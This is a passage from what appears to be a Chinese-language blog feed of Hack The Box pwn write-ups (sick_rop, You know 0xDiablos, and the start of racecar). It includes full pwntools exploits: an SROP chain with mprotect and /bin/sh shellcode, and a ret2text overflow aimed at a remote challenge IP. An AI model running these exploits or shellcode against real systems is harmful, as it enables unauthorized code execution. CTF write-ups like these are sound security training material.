class=\"line\">0x0000000000401012 : and al, 0x10 ; syscall</span><br><span class=\"line\">0x000000000040100d : and al, 8 ; mov rdx, qword ptr [rsp + 0x10] ; syscall</span><br><span class=\"line\">0x0000000000401044 : call qword ptr [rax + 0x41]</span><br><span class=\"line\">0x000000000040104c : dec ecx ; ret</span><br><span class=\"line\">0x000000000040100c : je 0x401032 ; or byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x10 ; syscall</span><br><span class=\"line\">0x0000000000401023 : je 0x401049 ; or byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x10 ; syscall</span><br><span class=\"line\">0x0000000000401054 : jmp 0x40104f</span><br><span class=\"line\">0x000000000040104d : leave ; ret</span><br><span class=\"line\">0x0000000000401010 : mov edx, dword ptr [rsp + 0x10] ; syscall</span><br><span class=\"line\">0x000000000040100b : mov esi, dword ptr [rsp + 8] ; mov rdx, qword ptr [rsp + 0x10] ; syscall</span><br><span class=\"line\">0x000000000040100f : mov rdx, qword ptr [rsp + 0x10] ; syscall</span><br><span class=\"line\">0x000000000040100e : or byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x10 ; syscall</span><br><span class=\"line\">0x0000000000401011 : push rsp ; and al, 0x10 ; syscall</span><br><span class=\"line\">0x0000000000401016 : ret</span><br><span class=\"line\">0x0000000000401049 : retf 0xffff</span><br><span class=\"line\">0x0000000000401014 : syscall</span><br></pre></td></tr></table></figure></p>\n<p>然后拖入 ida 发现就 4 个功能，第一次碰到</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void __fastcall __noreturn start(int a1, int a2, int a3, int a4, int a5, int a6)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  while ( 1 )</span><br><span class=\"line\">    vuln(a1, a2, a3, a4, a5, a6);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>启动写了一个死循环一直调用 vuln</p>\n<p>而 vuln 模块的话</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__int64 __fastcall vuln(int a1, int a2, int a3, int a4, int a5, int a6)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  size_t v6; // rax</span><br><span class=\"line\">  int v7; // edx</span><br><span class=\"line\">  int v8; // ecx</span><br><span class=\"line\">  int v9; // er8</span><br><span class=\"line\">  int v10; // er9</span><br><span class=\"line\">  const char *v11; // r10</span><br><span class=\"line\">  char v13[32]; // [rsp+0h] [rbp-20h] BYREF</span><br><span class=\"line\"></span><br><span class=\"line\">  v6 = read(a1, a2, a3, a4, a5, a6, v13, 0x300uLL);</span><br><span class=\"line\">  return write(a1, a2, v7, v8, v9, v10, v11, v6);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>调用了 read 和 write 函数，</p>\n<p>这个时候构造成 srop</p>\n<h4 id=\"exp\"><a class=\"anchor\" href=\"#exp\">#</a> exp</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(&#x27;./sick_rop&#x27;)</span><br><span class=\"line\">if args.R:</span><br><span class=\"line\"> p = remote(&quot;*.*.*.*&quot;,30479)</span><br><span class=\"line\">else:</span><br><span class=\"line\"> p = elf.process()</span><br><span class=\"line\">context.clear(arch=&#x27;amd64&#x27;)</span><br><span class=\"line\">context.log_level = &#x27;debug&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">syscall_ret = 0x401014</span><br><span class=\"line\">read = 0x401000</span><br><span class=\"line\">writable = 0x400000</span><br><span class=\"line\">new_ret = 0x400018</span><br><span class=\"line\">vuln = elf.sym.vuln</span><br><span class=\"line\"></span><br><span class=\"line\">payload = b&#x27;A&#x27;*40    # to our offset</span><br><span class=\"line\">payload += p64(vuln)</span><br><span class=\"line\">payload += p64(syscall_ret)</span><br><span class=\"line\"></span><br><span class=\"line\">frame = SigreturnFrame(kernel=&quot;amd64&quot;)</span><br><span class=\"line\">frame.rax = 0xa     # syscall for mprotect()</span><br><span class=\"line\">frame.rdi = writable</span><br><span class=\"line\">frame.rsi = 0x4000</span><br><span class=\"line\">frame.rdx = 0x7    # rwx (read ,write , execute)</span><br><span class=\"line\">frame.rsp = 0x4010d8 # this will be our new stack kind of ie addr 0x400...</span><br><span class=\"line\">frame.rip = syscall_ret</span><br><span class=\"line\"></span><br><span class=\"line\">payload += bytes(frame) # fake sigreturnframe</span><br><span class=\"line\"></span><br><span class=\"line\"># sending</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">payload = b&#x27;B&#x27;* (0xf - 1 ) # sigret 15 syscall</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\"># shellcode</span><br><span class=\"line\">shell_code = b&quot;\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\xb0\\x3b\\x99\\x0f\\x05&quot;</span><br><span class=\"line\">payload = shell_code.ljust(40, b&#x27;A&#x27;)</span><br><span class=\"line\">payload += p64(0x4010b8)</span><br><span class=\"line\">log.info(&#x27;[*] Sending second stage payload with &#123;&#125; bytes ...&#x27;.format(len(payload)))</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "PWN"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-You-know-0xDiablos-md/",
            "url": "https://lookhui.github.io/HTB-You-know-0xDiablos-md/",
            "title": "HTB-You_know_0xDiablos",
            "date_published": "2023-12-13T10:51:43.000Z",
            "content_html": "<h1 id=\"you-know-0xdiablos\"><a class=\"anchor\" href=\"#you-know-0xdiablos\">#</a> You know 0xDiablos</h1>\n<p>这个题真的很简单一个 ret2text</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Arch:     i386-32-little</span><br><span class=\"line\">RELRO:    Partial RELRO</span><br><span class=\"line\">Stack:    No canary found</span><br><span class=\"line\">NX:       NX disabled</span><br><span class=\"line\">PIE:      No PIE (0x8048000)</span><br><span class=\"line\">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></p>\n<p>又是一个 32 位的程序使用 strings</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tdX</span><br><span class=\"line\">/lib/ld-linux.so.2</span><br><span class=\"line\">libc.so.6</span><br><span class=\"line\">_IO_stdin_used</span><br><span class=\"line\">exit</span><br><span class=\"line\">fopen</span><br><span class=\"line\">puts</span><br><span class=\"line\">printf</span><br><span class=\"line\">fgets</span><br><span class=\"line\">stdout</span><br><span class=\"line\">setresgid</span><br><span class=\"line\">getegid</span><br><span class=\"line\">setvbuf</span><br><span class=\"line\">__libc_start_main</span><br><span class=\"line\">GLIBC_2.1</span><br><span class=\"line\">GLIBC_2.0</span><br><span class=\"line\">__gmon_start__</span><br><span class=\"line\">[^_]</span><br><span class=\"line\">flag.txt</span><br><span class=\"line\">Hurry up and try in on server side.</span><br><span class=\"line\">You know who are 0xDiablos:</span><br><span class=\"line\">;*2$&quot;</span><br><span class=\"line\">GCC: (Debian 8.3.0-19) 8.3.0</span><br><span class=\"line\">crtstuff.c</span><br><span class=\"line\">deregister_tm_clones</span><br><span class=\"line\">__do_global_dtors_aux</span><br><span class=\"line\">completed.6887</span><br><span class=\"line\">__do_global_dtors_aux_fini_array_entry</span><br><span class=\"line\">frame_dummy</span><br><span class=\"line\">__frame_dummy_init_array_entry</span><br><span class=\"line\">vuln.c</span><br><span class=\"line\">__FRAME_END__</span><br><span class=\"line\">__init_array_end</span><br><span class=\"line\">_DYNAMIC</span><br><span class=\"line\">__init_array_start</span><br><span class=\"line\">__GNU_EH_FRAME_HDR</span><br><span class=\"line\">_GLOBAL_OFFSET_TABLE_</span><br><span class=\"line\">__libc_csu_fini</span><br><span class=\"line\">__x86.get_pc_thunk.bx</span><br><span class=\"line\">printf@@GLIBC_2.0</span><br><span class=\"line\">__x86.get_pc_thunk.bp</span><br><span class=\"line\">vuln</span><br><span class=\"line\">fgets@@GLIBC_2.0</span><br><span class=\"line\">_edata</span><br><span class=\"line\">getegid@@GLIBC_2.0</span><br><span class=\"line\">__data_start</span><br><span class=\"line\">puts@@GLIBC_2.0</span><br><span class=\"line\">__gmon_start__</span><br><span class=\"line\">exit@@GLIBC_2.0</span><br><span class=\"line\">__dso_handle</span><br><span class=\"line\">_IO_stdin_used</span><br><span class=\"line\">__libc_start_main@@GLIBC_2.0</span><br><span class=\"line\">__libc_csu_init</span><br><span class=\"line\">setvbuf@@GLIBC_2.0</span><br><span class=\"line\">fopen@@GLIBC_2.1</span><br><span class=\"line\">_dl_relocate_static_pie</span><br><span class=\"line\">_fp_hw</span><br><span class=\"line\">stdout@@GLIBC_2.0</span><br><span class=\"line\">__bss_start</span><br><span class=\"line\">main</span><br><span class=\"line\">__TMC_END__</span><br><span class=\"line\">setresgid@@GLIBC_2.0</span><br><span class=\"line\">flag</span><br><span class=\"line\">.symtab</span><br><span class=\"line\">.strtab</span><br><span class=\"line\">.shstrtab</span><br><span class=\"line\">.interp</span><br><span class=\"line\">.note.gnu.build-id</span><br><span class=\"line\">.note.ABI-tag</span><br><span class=\"line\">.gnu.hash</span><br><span class=\"line\">.dynsym</span><br><span class=\"line\">.dynstr</span><br><span class=\"line\">.gnu.version</span><br><span class=\"line\">.gnu.version_r</span><br><span class=\"line\">.rel.dyn</span><br><span class=\"line\">.rel.plt</span><br><span class=\"line\">.init</span><br><span class=\"line\">.text</span><br><span class=\"line\">.fini</span><br><span class=\"line\">.rodata</span><br><span class=\"line\">.eh_frame_hdr</span><br><span class=\"line\">.eh_frame</span><br><span class=\"line\">.init_array</span><br><span class=\"line\">.fini_array</span><br><span class=\"line\">.dynamic</span><br><span class=\"line\">.got</span><br><span class=\"line\">.got.plt</span><br><span class=\"line\">.data</span><br><span class=\"line\">.bss</span><br><span class=\"line\">.comment</span><br></pre></td></tr></table></figure></p>\n<p>查看到里面有一个我们需要的 flag</p>\n<p>直接拖入 ida32 查看</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __gid_t v4; // [esp+0h] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  setvbuf(stdout, 0, 2, 0);</span><br><span class=\"line\">  v4 = getegid();</span><br><span class=\"line\">  setresgid(v4, v4, v4);</span><br><span class=\"line\">  puts(&quot;You know who are 0xDiablos: &quot;);</span><br><span class=\"line\">  vuln();</span><br><span class=\"line\">  return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>调用了 vuln 函数</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int vuln()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char s[180]; // [esp+0h] [ebp-B8h] BYREF</span><br><span class=\"line\"></span><br><span class=\"line\">  gets(s);</span><br><span class=\"line\">  return puts(s);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这里有一个危险函数 gets，s 分配了 180 的内存空间</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">char *__cdecl flag(int a1, int a2)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char *result; // eax</span><br><span class=\"line\">  char s[64]; // [esp+Ch] [ebp-4Ch] BYREF</span><br><span class=\"line\">  FILE *stream; // [esp+4Ch] [ebp-Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  stream = fopen(&quot;flag.txt&quot;, &quot;r&quot;);</span><br><span class=\"line\">  if ( !stream )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    puts(&quot;Hurry up and try in on server side.&quot;);</span><br><span class=\"line\">    exit(0);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  result = fgets(s, 64, stream);</span><br><span class=\"line\">  if ( a1 == -559038737 &amp;&amp; a2 == -1059139571 )</span><br><span class=\"line\">    return (char *)printf(s);</span><br><span class=\"line\">  return result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这个 flag 函数使用了 fopen 读取了内容储存到了 stream 上，我们现在只需要让</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a1 == -559038737以及 a2 == -1059139571</span><br></pre></td></tr></table></figure></p>\n<p>就能得到 flag</p>\n<p>查看汇编码得到</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:08049243 ; 13:   if ( a1 == -559038737 &amp;&amp; a2 == -1059139571 )</span><br><span class=\"line\">.text:08049243                 add     esp, 10h</span><br><span class=\"line\">.text:08049246                 cmp     [ebp+arg_0], 0DEADBEEFh</span><br><span class=\"line\">.text:0804924D                 jnz     short loc_8049269</span><br><span class=\"line\">.text:0804924F                 cmp     [ebp+arg_4], 0C0DED00Dh</span><br><span class=\"line\">.text:08049256                 jnz     short loc_804926C</span><br></pre></td></tr></table></figure></p>\n<p>也就是比较 0xDEADBEEF 和 0xC0DED00D 那直接构造 exp</p>\n<h4 id=\"exp\"><a class=\"anchor\" href=\"#exp\">#</a> exp</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">payload=b&#x27;a&#x27;*188+p32(0x80491E2)+p32(0)+p32(0xDEADBEEF)+p32(0xC0DED00D)</span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&quot;188.166.175.58&quot;,32705)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendlineafter(&quot;Diablos:&quot;,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "PWN"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-racecar-md/",
            "url": "https://lookhui.github.io/HTB-racecar-md/",
            "title": "HTB-racecar",
            "date_published": "2023-12-13T07:34:15.000Z",
            "content_html": "<h1 id=\"htb-racecar\"><a class=\"anchor\" href=\"#htb-racecar\">#</a> HTB-racecar</h1>\n<p>查看保护</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Arch:     i386-32-little</span><br><span class=\"line\">RELRO:    Full RELRO</span><br><span class=\"line\">Stack:    Canary found</span><br><span class=\"line\">NX:       NX enabled</span><br><span class=\"line\">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p>\n<p>保护全开</p>\n<p>使用 strings 查看一下字段</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/lib/ld-linux.so.2</span><br><span class=\"line\">libc.so.6</span><br><span class=\"line\">_IO_stdin_used</span><br><span class=\"line\">exit</span><br><span class=\"line\">srand</span><br><span class=\"line\">fopen</span><br><span class=\"line\">puts</span><br><span class=\"line\">time</span><br><span class=\"line\">putchar</span><br><span class=\"line\">stdin</span><br><span class=\"line\">printf</span><br><span class=\"line\">fgets</span><br><span class=\"line\">strlen</span><br><span class=\"line\">read</span><br><span class=\"line\">stdout</span><br><span class=\"line\">malloc</span><br><span class=\"line\">alarm</span><br><span class=\"line\">atoi</span><br><span class=\"line\">sleep</span><br><span class=\"line\">__cxa_finalize</span><br><span class=\"line\">setvbuf</span><br><span class=\"line\">strcmp</span><br><span class=\"line\">__libc_start_main</span><br><span class=\"line\">__stack_chk_fail</span><br><span class=\"line\">GLIBC_2.1</span><br><span class=\"line\">GLIBC_2.1.3</span><br><span class=\"line\">GLIBC_2.4</span><br><span class=\"line\">GLIBC_2.0</span><br><span class=\"line\">_ITM_deregisterTMCloneTable</span><br><span class=\"line\">__gmon_start__</span><br><span class=\"line\">_ITM_registerTMCloneTable</span><br><span class=\"line\">gfff</span><br><span class=\"line\">gfff</span><br><span class=\"line\">gfff</span><br><span class=\"line\">gfff</span><br><span class=\"line\">UWVS</span><br><span class=\"line\">[^_]</span><br><span class=\"line\">[1;33m</span><br><span class=\"line\">[1;36m</span><br><span class=\"line\">[1;32m</span><br><span class=\"line\">[1;31m</span><br><span class=\"line\">[1;34m</span><br><span class=\"line\">[1;35m</span><br><span class=\"line\">%s      ______                                       %s|xxx|</span><br><span class=\"line\">%s     /|_||_\\`.__                                   %s| F |</span><br><span class=\"line\">%s    (   _    _ _\\                                  %s|xxx|</span><br><span class=\"line\">%s*** =`-(_)--(_)-&#x27;                                  %s| I |</span><br><span class=\"line\">                                                   %s|xxx|</span><br><span class=\"line\">                                                   %s| N |</span><br><span class=\"line\">                                                   %s| I |</span><br><span class=\"line\">%s             _-_-  _/\\______\\__                    %s| S |</span><br><span class=\"line\">%s           _-_-__ / ,-. -|-  ,-.`-.                %s|xxx|</span><br><span class=\"line\">%s            _-_- `( o )----( o )-&#x27;                 %s| H |</span><br><span class=\"line\">%s                   `-&#x27;      `-&#x27;                    %s|xxx|</span><br><span class=\"line\">Select race:</span><br><span class=\"line\">1. Highway battle</span><br><span class=\"line\">2. Circuit</span><br><span class=\"line\">%s[-] Invalid choice!%s</span><br><span class=\"line\">Select car:</span><br><span class=\"line\">[*] Waiting for the race to finish...</span><br><span class=\"line\">[+] You won the race!! You get 100 coins!</span><br><span class=\"line\">[+] Current coins: [%d]%s</span><br><span class=\"line\">[!] Do you have anything to say to the press after your big victory?</span><br><span class=\"line\">&gt; %s</span><br><span class=\"line\">flag.txt</span><br><span class=\"line\">%s[-] Could not open flag.txt. Please contact the creator.</span><br><span class=\"line\">[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this:</span><br><span class=\"line\">[-] You lost the race and all your coins!</span><br><span class=\"line\">%sInsert your data:</span><br><span class=\"line\">Name:</span><br><span class=\"line\">Nickname:</span><br><span class=\"line\">%s[+] Welcome [%s%s%s]!</span><br><span class=\"line\">%s[*] Your name is [%s%s%s] but everybody calls you.. [%s%s%s]!</span><br><span class=\"line\">[*] Current coins: [%d]</span><br><span 